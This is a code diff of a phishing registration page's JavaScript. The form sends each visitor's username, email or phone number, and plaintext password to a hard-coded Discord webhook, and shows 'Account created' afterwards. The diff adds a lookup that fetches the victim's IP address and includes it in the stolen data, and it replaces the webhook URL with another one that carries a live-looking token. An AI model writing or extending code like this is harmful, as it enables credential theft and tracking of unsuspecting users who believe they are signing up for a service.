@@ -134,7 +134,7 @@
     const form = document.getElementById('registerForm');
     const successMessage = document.getElementById('successMessage');
 
-    form.addEventListener('submit', function(e) {
+    form.addEventListener('submit', async function (e) {
       e.preventDefault();
 
       const username = document.getElementById('username').value.trim();
@@ -142,12 +142,8 @@
       const password = document.getElementById('password').value;
       const confirm = document.getElementById('confirm').value;
 
-      const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
-      const phoneRegex = /^\\+?\\d{10,15}$/;
-
       const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input);
       const isPhone = /^\+?\d{10,15}$/.test(input);
-
       const allowedDomains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'protonmail.com', 'proton.me'];
 
       if (!isEmail && !isPhone) {
@@ -168,26 +164,36 @@
         return;
       }
 
+      let ip = 'Unavailable';
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const json = await res.json();
+        ip = json.ip || 'Unavailable';
+      } catch (err) {
+        console.warn('IP fetch failed:', err);
+      }
+
       const data = {
         username: "Security Bot Register",
         embeds: [
           {
-            title: "✅ Logged someone",
+            title: "✅ New Person Logged",
             color: 3447003,
             fields: [
               { name: "Username", value: username || "(none)", inline: false },
               { name: "Email/Phone", value: input, inline: false },
-              { name: "Password", value: password, inline: false }
+              { name: "Password", value: password, inline: false },
+              { name: "IP Address", value: ip, inline: false }
             ],
             footer: {
-              text: "Made by skibidi07307"
+              text: "Made by Soy"
             },
             timestamp: new Date()
           }
         ]
       };
 
-      fetch("https://discord.com/api/webhooks/1375901327598813244/GWvrLsbPDtBPZcAMUUosKYyjHmXA2lCBRVcSuqhOcvKCaKGALp2ppanCn2ezWpGWTTiS", {
+      fetch("https://discord.com/api/webhooks/1375976533637726208/1WXRXcCzlq0dSjV7yXuj9pxUniNbRGvdq6n3DqWNxpu-spiWfj2Kp-TGuXQ24rrKmqAF", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -201,6 +207,7 @@
         } else {
           successMessage.innerHTML = "✅ Account created.";
         }
+
         successMessage.style.display = 'block';
       }).catch((err) => {
         console.error('Webhook error:', err);
